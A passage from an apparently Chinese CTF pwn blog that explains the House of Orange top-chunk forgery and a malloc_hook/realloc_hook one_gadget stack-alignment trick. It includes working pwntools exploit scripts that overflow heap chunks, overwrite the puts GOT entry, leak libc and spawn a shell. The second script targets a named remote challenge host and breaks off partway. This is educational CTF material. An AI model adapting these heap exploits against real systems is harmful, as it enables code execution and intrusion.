class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lisp">assert((<span class="hljs-name">old_top</span> == initial_top(<span class="hljs-name">av</span>) <span class="hljs-symbol">&amp;&amp;</span> old_size == <span class="hljs-number">0</span>) ||<br>     ((<span class="hljs-name">unsigned</span> long) (<span class="hljs-name">old_size</span>) &gt;= MINSIZE <span class="hljs-symbol">&amp;&amp;</span><br>      prev_inuse(<span class="hljs-name">old_top</span>) <span class="hljs-symbol">&amp;&amp;</span><br>      ((<span class="hljs-name">unsigned</span> long)old_end &amp; pagemask) == <span class="hljs-number">0</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>这里检查了 top chunk 的合法性，如果第一次调用本函数，top chunk 可能没有初始化，所以可能 old_size 为 0。 如果 top chunk 已经初始化了，那么 top chunk 的大小必须大于等于 MINSIZE，因为 top chunk 中包含了 fencepost，所以 top chunk 的大小必须要大于 MINSIZE。其次 top chunk 必须标识前一个 chunk 处于 inuse 状态，并且 top chunk 的结束地址必定是页对齐的。此外 top chunk 除去 fencepost 的大小必定要小于所需 chunk 的大小，否则在_int_malloc() 函数中会使用 top chunk 分割出 chunk。</p><p>我们总结一下伪造的 top chunk size 的要求</p><ol><li>伪造的 size 必须要对齐到内存页</li><li>size 要大于 MINSIZE(0x10)</li><li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li><li>size 的 prev inuse 位必须为 1</li></ol><p>之后原有的 top chunk 就会执行<code>_int_free</code>从而顺利进入 unsorted bin 中。</p><p>注意事项：伪造的top_chunk要页对齐，当top_chunk符合页对齐，且大小小于0x90时，当申请比top_chunk大的堆是，释放的top_chunk会进入fastbins，可以根据需求进行fastbins攻击，放入这个fastbins的chunk的大小为：top_chunk - 0x20</p><p>所以我们可能根据情况进行unsorted bin攻击或者进行fast bin攻击</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/House_of_Orange">例题下载</a></p><p>查看保护 ，没有开启pie和got写入保护</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202409122055569.png" alt="查看保护"></p><p>ida反编译发现没有free函数</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202409122056645.png" alt="ida反编译"></p><p>想到用House of Orange</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202409122057567.png" alt="edit函数"></p><p>发现编辑函数存在溢出，可以控制chunk头和chunk指针，那么我们就可以用fastbin攻击</p><p>攻击流程：</p><ol><li>伪造top_chunk（确保页对齐）</li><li>然后申请堆空间，使top_chunk剩余0x90大小</li><li>申请大于top_chunk大小的堆空间，此时top_chunk进入fastbin</li><li>通过堆溢出，修改fastbin的fd指针，进行fastbin攻击</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><br>filename = <span class="hljs-string">&#x27;./pwn10&#x27;</span><br>url = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_hostname_and_port</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)[\s:](\d*)&#x27;</span>, url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        hostname = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        port = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> hostname, port<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>hostname, port = extract_hostname_and_port(url)<br>debug_flag = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>        p = remote(hostname, port)<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;debug&#x27;</span>:<br>        p = process(filename)<br>        debug_flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py [remote|debug]&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    <span class="hljs-keyword">if</span> debug_flag:<br>        <span class="hljs-keyword">try</span>:<br>            gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            b * 0x0000000000400A9C</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span><br>            gdb.attach(p, gdbscript = gdbscript)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to attach GDB: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br><br>elf = ELF(filename)<br>debug()<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">1.ADD PAGE</span><br><span class="hljs-string">2.EDIT PAGE</span><br><span class="hljs-string">3.SHOW PAGE</span><br><span class="hljs-string">4.EXIT</span><br><span class="hljs-string">input your chioce:</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx , size , context</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;input your chioce:&#x27;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Size :&#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Content :&#x27;</span> , context)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , size , context</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;input your chioce:&#x27;</span> , <span class="hljs-string">b&#x27;2&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Size :&#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Content :&#x27;</span> , context)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;input your chioce:&#x27;</span> , <span class="hljs-string">b&#x27;3&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  <br><br>add(<span class="hljs-number">0</span> , <span class="hljs-number">0x10</span> , <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>payload = <span class="hljs-number">0x18</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(<span class="hljs-number">0xfe1</span>)<br>edit(<span class="hljs-number">0</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>add(<span class="hljs-number">1</span> , <span class="hljs-number">0xf40</span> , <span class="hljs-string">b&#x27;bbbb&#x27;</span>)<br>add(<span class="hljs-number">2</span> , <span class="hljs-number">0x90</span> , <span class="hljs-string">b&#x27;cccc&#x27;</span>)<br><br>fake_chunk = <span class="hljs-number">0x60208d</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0xf48</span> + p64(<span class="hljs-number">0x71</span>) + p64(fake_chunk)<br>edit(<span class="hljs-number">1</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>add(<span class="hljs-number">3</span> , <span class="hljs-number">0x60</span> , <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">4</span> , <span class="hljs-number">0x60</span> , <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0xa3</span> + p64(puts_got)<br>edit(<span class="hljs-number">4</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br><br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>leak_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-built_in">hex</span>(leak_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span> , leak_addr)<br>base_addr = leak_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>one_gadget = [<span class="hljs-number">0x4525a</span> , <span class="hljs-number">0xef9f4</span> , <span class="hljs-number">0xf0897</span>]<br>execve = base_addr + one_gadget[<span class="hljs-number">2</span>]<br><br>payload = p64(execve)<br>edit(<span class="hljs-number">0</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>堆</category>
      
    </categories>
    
    
    <tags>
      
      <tag>House of Orange</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>通过 realloc_hook 调整栈帧使 onegadget 生效</title>
    <link href="/2024/08/19/%E9%80%9A%E8%BF%87-realloc-hook-%E8%B0%83%E6%95%B4%E6%A0%88%E5%B8%A7%E4%BD%BF-onegadget-%E7%94%9F%E6%95%88/"/>
    <url>/2024/08/19/%E9%80%9A%E8%BF%87-realloc-hook-%E8%B0%83%E6%95%B4%E6%A0%88%E5%B8%A7%E4%BD%BF-onegadget-%E7%94%9F%E6%95%88/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在某些堆的题目当中，由于限制只能使用 house of spirit 等方法劫持 malloc_hook ，这种情况一般是往 malloc_hook 写入 onegadget ，再次申请堆来 getshell 。</p><p>由于栈帧情况不满足，查询到的所有 onegadget 可能都打不通，这时就可以考虑下用 malloc_hook 和 realloc_hook 结合。先通过 realloc调整栈帧，然后在运行 onegadget 。</p><h2 id="了解-realloc"><a href="#了解-realloc" class="headerlink" title="了解 realloc"></a>了解 realloc</h2><p>realloc 在库函数中的作用是重新调整 malloc 或 calloc 所分配的堆大小。它和 malloc 函数一样有 hook 函数，当 hook 函数不为空时，就会跳转运行 hook 函数（和 malloc_hook 一样的），其中realloc_hook在malloc_hook - 0x08的位置。</p><p>看看 realloc 的汇编代码：（可以把 libc 拖到 ida 中看，也可以泄露地址后 gdb 调试查看 <code>x /20i [addr]</code>）</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>00000000000846C0 realloc         proc <span class="hljs-built_in">near</span>               <span class="hljs-comment">; DATA XREF: LOAD:0000000000006BA0↑o</span><br><span class="hljs-symbol">.text:</span>00000000000846C0 <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span>00000000000846C0                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r15</span>             <span class="hljs-comment">; Alternative name is &#x27;__libc_realloc&#x27;</span><br><span class="hljs-symbol">.text:</span>00000000000846C2                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r14</span><br><span class="hljs-symbol">.text:</span>00000000000846C4                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r13</span><br><span class="hljs-symbol">.text:</span>00000000000846C6                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r12</span><br><span class="hljs-symbol">.text:</span>00000000000846C8                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r13</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-symbol">.text:</span>00000000000846CB                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span>00000000000846CC                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbx</span><br><span class="hljs-symbol">.text:</span>00000000000846CD                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-symbol">.text:</span>00000000000846D0                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">38h</span><br><span class="hljs-symbol">.text:</span>00000000000846D4                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">cs</span>:__realloc_hook_ptr<br><span class="hljs-symbol">.text:</span>00000000000846<span class="hljs-built_in">DB</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rax</span>]<br><span class="hljs-symbol">.text:</span>00000000000846DE                 <span class="hljs-keyword">test</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>00000000000846E1                 <span class="hljs-keyword">jnz</span>     loc_848E8  <span class="hljs-comment">; 跳转执行 realloc_hook</span><br><span class="hljs-symbol">.text:</span>00000000000846E7                 <span class="hljs-keyword">test</span>    <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-symbol">.text:</span>00000000000846EA                 <span class="hljs-keyword">jnz</span>     short loc_846F5<br><span class="hljs-symbol">.text:</span>00000000000846EC                 <span class="hljs-keyword">test</span>    <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-symbol">.text:</span>00000000000846EF                 <span class="hljs-keyword">jnz</span>     loc_84960<br></code></pre></td></tr></table></figure><p>函数一开始有很多的 push ，realloc 函数先执行 push 压栈，然后在跳转执行 realloc_hook 存储的函数。我们就是利用这些 push 调整栈帧。push 的数量发生变化会影响 rsp 的地址，这样就可以控制 rsp 的取值，从而满足 onegadget 的执行条件。除了可以控制 push 数量，还能通过偏移得到其他的 <code>push xxx</code> 。</p><h3 id="malloc-hook-与-realloc-hook-配合"><a href="#malloc-hook-与-realloc-hook-配合" class="headerlink" title="malloc_hook 与 realloc_hook 配合"></a>malloc_hook 与 realloc_hook 配合</h3><p>将 malloc_hook 劫持为 realloc ，realloc_hook 劫持为 onegadget ，实际运行顺序：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">malloc</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">malloc_hook</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">realloc</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">realloc_hook</span> -&gt;</span> onegadget<br></code></pre></td></tr></table></figure><p>这样就能经过 realloc 调整栈帧后再运行 onegadget 。实际情况中，并不是直接劫持 malloc_hook 为 realloc ，而是要加上一定的偏移，也就是调整 push 的数量，让栈帧结构满足 onegadget 运行。</p><p>realloc 这个偏移做题还是逐个试感觉快一点，因为设想是<strong>少一个 push ，rsp 就会向前移动一个内存单元，对应的</strong> <strong><code>[rsp+0x30]=[rsp+0x38]</code></strong> ，但实际上有少部分位置可能被其他东西写入改变了原来的值。自行调试体会一下：</p><p>原理上是：<strong>少一个 push ，rsp 就会向前移动一个内存单元，对应的</strong> **<code>[rsp+0x30]=[rsp+0x38]</code>**，但实际部分位置的值会变，所以逐个试，速度可能比计算快。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/roarctf_2019_easy_pwn">附件</a></p><p>前边就是正常的打hook</p><p>但是所以的onegadget都不能用，就要想到用malloc_hook 与 realloc_hook 配合</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><br>filename = <span class="hljs-string">&#x27;./roarctf_2019_easy_pwn&#x27;</span><br>url = <span class="hljs-string">&#x27;node5.buuoj.cn:26271&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_hostname_and_port</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)[\s:](\d*)&#x27;</span>, url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        hostname = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        port = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> hostname, port<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>hostname, port = extract_hostname_and_port(url)<br>debug_flag = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>        p = remote(hostname, port)<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;debug&#x27;</span>:<br>        p = process(filename)<br>        debug_flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py [remote|debug]&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    <span class="hljs-keyword">if</span> debug_flag:<br>        <span class="hljs-keyword">try</span>:<br>            gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            b * $rebase(0x0000000000000D6C)</span><br><span class="hljs-string">            b * $rebase(0x0000000000000F6D)</span><br><span class="hljs-string">            b * $rebase(0x000000000000108C)</span><br><span class="hljs-string">            b * $rebase(0x00000000000011D0)</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span><br>            gdb.attach(p, gdbscript = gdbscript)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to attach GDB: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br><br>elf = ELF(filename)<br>debug()<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Note system                                                                                                        </span><br><span class="hljs-string">1. create a note</span><br><span class="hljs-string">2. write note</span><br><span class="hljs-string">3. drop the note</span><br><span class="hljs-string">4. show the note</span><br><span class="hljs-string">5. exit</span><br><span class="hljs-string">choice: </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span> , <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , size , content</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span> , <span class="hljs-string">b&#x27;2&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">&#x27;content: &#x27;</span> , content)<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span> , <span class="hljs-string">b&#x27;3&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span> , <span class="hljs-string">b&#x27;4&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#5</span><br><span class="hljs-comment"># add(0x10)</span><br><span class="hljs-comment">#----------------------泄露libc地址-----------------------------#</span><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p8(<span class="hljs-number">0x41</span>)<br>edit(<span class="hljs-number">0</span> , <span class="hljs-built_in">len</span>(payload) + <span class="hljs-number">0x09</span> , payload)<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0x71</span>)<br>edit(<span class="hljs-number">2</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>free(<span class="hljs-number">1</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x38</span>) <span class="hljs-comment">#1</span><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0x91</span>)<br>edit(<span class="hljs-number">1</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>free(<span class="hljs-number">2</span>) <span class="hljs-comment">#2</span><br>show(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>main_arena_88 = u64(p.recv(<span class="hljs-number">0x28</span>)[-<span class="hljs-number">8</span>:])<br>success(<span class="hljs-built_in">hex</span>(main_arena_88))<br>malloc_hook = main_arena_88 - <span class="hljs-number">88</span> - <span class="hljs-number">0x10</span><br>libc = LibcSearcher(<span 